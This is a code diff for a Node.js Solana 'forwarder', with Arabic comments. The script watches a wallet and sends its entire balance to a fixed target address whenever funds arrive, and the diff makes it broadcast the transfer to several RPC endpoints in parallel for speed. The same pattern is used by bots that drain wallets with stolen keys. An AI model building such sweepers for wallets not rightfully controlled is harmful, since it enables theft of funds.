@@ -15,21 +15,47 @@ if (!process.env.RPC_URL || !process.env.PRIVATE_KEY) {
   process.exit(1);
 }
 
-// تطبيع RPC (Connection يحتاج http/https)
-let rawRpc = process.env.RPC_URL.trim();
-if (rawRpc.startsWith('wss://')) {
-  console.warn('⚠️ تحويل RPC_URL من wss:// إلى https:// للاتصال');
-  rawRpc = 'https://' + rawRpc.slice('wss://'.length);
-} else if (rawRpc.startsWith('ws://')) {
-  console.warn('⚠️ تحويل RPC_URL من ws:// إلى http:// للاتصال');
-  rawRpc = 'http://' + rawRpc.slice('ws://'.length);
-} else if (!rawRpc.startsWith('http://') && !rawRpc.startsWith('https://')) {
-  console.error('❌ RPC_URL يجب أن يبدأ بـ http(s) أو ws(s)');
-  process.exit(1);
+// روابط RPC إضافية (اختيارية)
+const rpcUrls = [process.env.RPC_URL];
+if (process.env.RPC_URL2) {
+  rpcUrls.push(process.env.RPC_URL2);
+  console.log('✅ تم إضافة RPC_URL2');
+}
+if (process.env.RPC_URL3) {
+  rpcUrls.push(process.env.RPC_URL3);
+  console.log('✅ تم إضافة RPC_URL3');
 }
 
-// إنشاء اتصال بسرعة processed
-const connection = new Connection(rawRpc, 'processed');
+// تطبيع جميع روابط RPC
+function normalizeRpc(url) {
+  let normalizedUrl = url.trim();
+  if (normalizedUrl.startsWith('wss://')) {
+    console.warn(`⚠️ تحويل ${url} من wss:// إلى https://`);
+    normalizedUrl = 'https://' + normalizedUrl.slice('wss://'.length);
+  } else if (normalizedUrl.startsWith('ws://')) {
+    console.warn(`⚠️ تحويل ${url} من ws:// إلى http://`);
+    normalizedUrl = 'http://' + normalizedUrl.slice('ws://'.length);
+  } else if (!normalizedUrl.startsWith('http://') && !normalizedUrl.startsWith('https://')) {
+    console.error(`❌ ${url} يجب أن يبدأ بـ http(s) أو ws(s)`);
+    process.exit(1);
+  }
+  return normalizedUrl;
+}
+
+// تطبيع جميع الروابط وإنشاء connections
+const normalizedRpcs = rpcUrls.map(normalizeRpc);
+const connections = normalizedRpcs.map(url => ({
+  url,
+  connection: new Connection(url, 'processed'),
+  name: url.includes('quiknode') ? 'QuickNode' : 
+        url.includes('alchemy') ? 'Alchemy' :
+        url.includes('helius') ? 'Helius' : 'RPC'
+}));
+
+console.log(`🔗 تم إنشاء ${connections.length} اتصالات RPC`);
+
+// الاتصال الرئيسي (للمراقبة)
+const primaryConnection = connections[0].connection;
 
 // تحميل المحفظة
 let wallet;
@@ -44,7 +70,8 @@ try {
 console.log('🚀 Forwarder detailed started');
 console.log('Wallet:', wallet.publicKey.toString());
 console.log('Target:', TARGET_ADDRESS.toString());
-console.log('RPC:', rawRpc);
+console.log('Primary RPC:', normalizedRpcs[0]);
+console.log(`📡 عدد RPCs المفعلة: ${connections.length}`);
 
 // السجلات
 const logs = [];
@@ -61,7 +88,87 @@ function addSendDetail(detail) {
   const entry = { id: Date.now() + '-' + Math.floor(Math.random()*1000), timestamp: new Date().toISOString(), ...detail };
   sendDetails.unshift(entry);
   if (sendDetails.length > 500) sendDetails.splice(500);
-  console.log(`[SEND_DETAIL] stage=${entry.stage} sig=${entry.signature||'N/A'} total=${entry.totalDurationMs||'N/A'}ms`);
+  
+  // إظهار تفصيل أوقات RPC لتحديد مصدر التأخير
+  let rpcBreakdown = '';
+  if (entry.rpcLatency) {
+    const rpcTimes = Object.entries(entry.rpcLatency)
+      .map(([key, value]) => `${key}:${value}ms`)
+      .join(' | ');
+    rpcBreakdown = ` RPC_TIMES: ${rpcTimes}`;
+    
+    // إضافة النسبة المئوية للـ RPC
+    if (entry.rpcPercentage !== undefined) {
+      rpcBreakdown += ` | RPC_USAGE: ${entry.rpcPercentage}% | LOCAL: ${entry.localProcessingMs}ms`;
+    }
+  }
+  
+  console.log(`[SEND_DETAIL] stage=${entry.stage} sig=${entry.signature||'N/A'} total=${entry.totalDurationMs||'N/A'}ms${rpcBreakdown}`);
+}
+
+// إرسال معاملة إلى RPC واحد
+async function sendToSingleRPC(rpcInfo, rawTransaction, amount) {
+  const sendStart = Date.now();
+  try {
+    const sig = await rpcInfo.connection.sendRawTransaction(rawTransaction, { 
+      skipPreflight: true, 
+      preflightCommitment: 'processed', 
+      maxRetries: 0 
+    });
+    const sendTime = Date.now() - sendStart;
+    return {
+      success: true,
+      signature: sig,
+      rpcName: rpcInfo.name,
+      rpcUrl: rpcInfo.url,
+      sendTimeMs: sendTime,
+      amount
+    };
+  } catch (err) {
+    return {
+      success: false,
+      error: String(err),
+      rpcName: rpcInfo.name,
+      rpcUrl: rpcInfo.url,
+      sendTimeMs: Date.now() - sendStart
+    };
+  }
+}
+
+// البث المتوازي إلى جميع RPCs
+async function broadcastToAllRPCs(rawTransaction, amount) {
+  const broadcastStart = Date.now();
+  
+  // إرسال لكل RPCs بالتوازي
+  const sendPromises = connections.map(rpcInfo => 
+    sendToSingleRPC(rpcInfo, rawTransaction, amount)
+  );
+  
+  try {
+    // استخدام Promise.race للحصول على أسرع استجابة ناجحة
+    const result = await Promise.race(sendPromises);
+    
+    // الحصول على نتائج باقي الـ RPCs (لا ننتظرها)
+    Promise.allSettled(sendPromises).then(results => {
+      const successCount = results.filter(r => r.value?.success).length;
+      const failCount = results.filter(r => !r.value?.success).length;
+      addLog('broadcast', `البث المتوازي: ${successCount} نجح، ${failCount} فشل`);
+    });
+    
+    return {
+      ...result,
+      broadcastTimeMs: Date.now() - broadcastStart,
+      totalRpcs: connections.length
+    };
+    
+  } catch (err) {
+    return {
+      success: false,
+      error: String(err),
+      broadcastTimeMs: Date.now() - broadcastStart,
+      totalRpcs: connections.length
+    };
+  }
 }
 
 // إرسال كل الرصيد مع قياسات زمنية
@@ -91,58 +198,88 @@ async function forwardFundsDetailed(newBalance) {
     }
     detail.lamportsToSend = amount;
 
-    // blockhash
+    // blockhash - استخدام الأسرع من الـ RPC الرئيسي
     const bhStart = Date.now();
-    const { blockhash } = await connection.getLatestBlockhash('processed');
+    const { blockhash } = await primaryConnection.getLatestBlockhash('processed');
     detail.rpcLatency.getBlockhashMs = Date.now() - bhStart;
 
-    // بناء وتوقيع
-    const tx = new Transaction({ recentBlockhash: blockhash, feePayer: wallet.publicKey });
-    tx.add(SystemProgram.transfer({
+    // بناء المعاملة محسن - تحضير الـ instruction مسبقاً 
+    const transferInstruction = SystemProgram.transfer({
       fromPubkey: wallet.publicKey,
       toPubkey: TARGET_ADDRESS,
       lamports: amount
-    }));
+    });
+    
+    // بناء وتوقيع محسن
+    const tx = new Transaction({ 
+      recentBlockhash: blockhash, 
+      feePayer: wallet.publicKey 
+    }).add(transferInstruction);
+    
     tx.sign(wallet);
-    const raw = tx.serialize();
+    const raw = tx.serialize({ requireAllSignatures: false });
 
-    // sendRawTransaction
-    const sendStart = Date.now();
-    let sig;
-    try {
-      sig = await connection.sendRawTransaction(raw, { skipPreflight: false, maxRetries: 3 });
-      detail.signature = sig;
-      detail.rpcLatency.sendRawMs = Date.now() - sendStart;
-      addLog('send', `تم إرسال ${amount / LAMPORTS_PER_SOL} SOL`, { signature: sig });
-      detail.stage = 'sent';
-    } catch (err) {
-      detail.error = String(err);
-      detail.stage = 'send_failed';
-      addLog('error', `فشل sendRawTransaction: ${String(err)}`);
+    // البث المتوازي إلى جميع RPCs
+    const broadcastResult = await broadcastToAllRPCs(raw, amount);
+    
+    if (!broadcastResult.success) {
+      detail.error = broadcastResult.error;
+      detail.stage = 'broadcast_failed';
+      detail.rpcLatency.broadcastMs = broadcastResult.broadcastTimeMs;
+      
+      // معالجة أفضل للأخطاء مع skipPreflight: true
+      const errMsg = String(broadcastResult.error);
+      if (errMsg.includes('insufficient') || errMsg.includes('rent')) {
+        addLog('warning', `رسوم غير كافية أو مشكلة رصيد: ${errMsg}`);
+      } else if (errMsg.includes('blockhash') || errMsg.includes('expired')) {
+        addLog('warning', `blockhash منتهي الصلاحية: ${errMsg}`);
+      } else {
+        addLog('error', `فشل البث المتوازي: ${errMsg}`);
+      }
       addSendDetail({ ...detail, totalDurationMs: Date.now()-t0 });
       return;
     }
+    
+    // نجح البث
+    detail.signature = broadcastResult.signature;
+    detail.rpcLatency.broadcastMs = broadcastResult.broadcastTimeMs;
+    detail.winnerRpc = broadcastResult.rpcName;
+    detail.totalRpcs = broadcastResult.totalRpcs;
+    addLog('send', `✅ بث متوازي إلى ${broadcastResult.totalRpcs} RPCs - الفائز: ${broadcastResult.rpcName} (${broadcastResult.sendTimeMs}ms)`, { 
+      signature: broadcastResult.signature 
+    });
+    detail.stage = 'sent';
 
-    // قياسات بعد الإرسال
+    // قياسات بعد الإرسال - تتبع كل RPC call منفرد
+    const sig = detail.signature;
     try {
       const pStart = Date.now();
-      await connection.confirmTransaction(sig, 'processed');
+      await primaryConnection.confirmTransaction(sig, 'processed');
       detail.processedMs = Date.now() - pStart;
+      detail.rpcLatency.confirmProcessedMs = detail.processedMs;
     } catch {}
 
     try {
       const cStart = Date.now();
-      await connection.confirmTransaction(sig, 'confirmed');
+      await primaryConnection.confirmTransaction(sig, 'confirmed');
       detail.confirmedMs = Date.now() - cStart;
+      detail.rpcLatency.confirmConfirmedMs = detail.confirmedMs;
     } catch {}
 
     try {
       const fStart = Date.now();
-      await connection.confirmTransaction(sig, 'finalized');
+      await primaryConnection.confirmTransaction(sig, 'finalized');
       detail.finalizedMs = Date.now() - fStart;
+      detail.rpcLatency.confirmFinalizedMs = detail.finalizedMs;
     } catch {}
 
     detail.totalDurationMs = Date.now() - t0;
+    
+    // حساب النسبة المئوية من الوقت المستخدم في RPC
+    const totalRpcTime = Object.values(detail.rpcLatency).reduce((sum, time) => sum + (time || 0), 0);
+    detail.rpcPercentage = Math.round((totalRpcTime / detail.totalDurationMs) * 100);
+    detail.localProcessingMs = detail.totalDurationMs - totalRpcTime;
+    
     addSendDetail(detail);
 
   } catch (err) {
@@ -160,11 +297,11 @@ let subscriptionId = null;
 
 async function startMonitor() {
   try {
-    lastBalance = await connection.getBalance(wallet.publicKey, 'processed');
+    lastBalance = await primaryConnection.getBalance(wallet.publicKey, 'processed');
     addLog('info', `الرصيد الابتدائي: ${lastBalance / LAMPORTS_PER_SOL} SOL`);
     if (lastBalance > 0) forwardFundsDetailed(lastBalance);
 
-    subscriptionId = connection.onAccountChange(
+    subscriptionId = primaryConnection.onAccountChange(
       wallet.publicKey,
       (info) => {
         const newBal = info.lamports;
@@ -178,7 +315,7 @@ async function startMonitor() {
       'processed'
     );
 
-    addLog('info', `تم الاشتراك (id=${subscriptionId})`);
+    addLog('info', `تم الاشتراك عبر ${connections[0].name} (id=${subscriptionId})`);
   } catch (err) {
     addLog('error', `فشل بدء المراقبة: ${String(err)}`);
   }
@@ -211,7 +348,7 @@ load();setInterval(load,2000);
 app.get('/api/logs', (req,res)=>res.json(logs));
 app.get('/api/send-details',(req,res)=>res.json(sendDetails.slice(0,parseInt(req.query.limit||'20'))));
 
-const PORT = process.env.PORT||3000;
+const PORT = process.env.PORT||5000;
 app.listen(PORT, ()=> console.log(`🌐 افتح http://localhost:${PORT}`));
 
 // بدء المراقبة
